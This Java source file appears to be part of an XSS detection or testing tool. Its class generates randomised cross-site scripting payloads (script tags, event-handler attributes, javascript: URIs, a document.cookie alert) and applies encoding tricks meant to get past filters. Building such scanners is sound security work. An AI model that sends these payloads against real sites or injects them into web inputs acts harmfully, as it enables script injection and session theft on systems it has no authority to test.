package com.xssdetector;

import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.stream.Collectors;

public class PayloadGenerator {
    private List<String> basePayloads;
    private List<java.util.function.Function<String, String>> obfuscationMethods;
    private Random random;

    public PayloadGenerator() {
        this.random = new Random();
        initializePayloads();
        initializeObfuscationMethods();
    }

    private void initializePayloads() {
        this.basePayloads = List.of(
            "javascript:alert(1)",
            "javascript:alert(document.cookie)",
            "onload=alert(1)",
            "\"><script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            // Context-aware payloads
            "'\"><script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "<body onload=alert(1)>",
            "<iframe src='javascript:alert(1)'>",
            "<video><source onerror=\"javascript:alert(1)\">"
        );
    }

    private void initializeObfuscationMethods() {
        this.obfuscationMethods = List.of(
            x -> x.replace("alert", "al" + "ert"),
            x -> x.replace("script", "scr" + "ipt"),
            x -> x.chars()
                 .mapToObj(c -> String.format("\\x%02x", c))
                 .collect(Collectors.joining()),
            x -> x.chars()
                 .mapToObj(c -> String.format("%%%02x", c))
                 .collect(Collectors.joining()),
            // New evasion techniques
            x -> x.replaceAll("(?i)alert", "a\\u006cert"),
            x -> x.replaceAll("(?i)script", "scr\\u0069pt"),
            x -> x.replaceAll("(?i)onload", "on\\u006coad"),
            x -> x.replaceAll("(?i)onerror", "on\\u0065rror"),
            x -> x.replaceAll("(?i)eval", "ev\\u0061l")
        );
    }

    public List<String> generatePayloads(int count) {
        List<String> payloads = new ArrayList<>();
        for (int i = 0; i < count; i++) {
            String payload = basePayloads.get(random.nextInt(basePayloads.size()));
            if (random.nextBoolean()) {
                payload = obfuscationMethods.get(random.nextInt(obfuscationMethods.size())).apply(payload);
            }
            payloads.add(payload);
        }
        return payloads;
    }
}
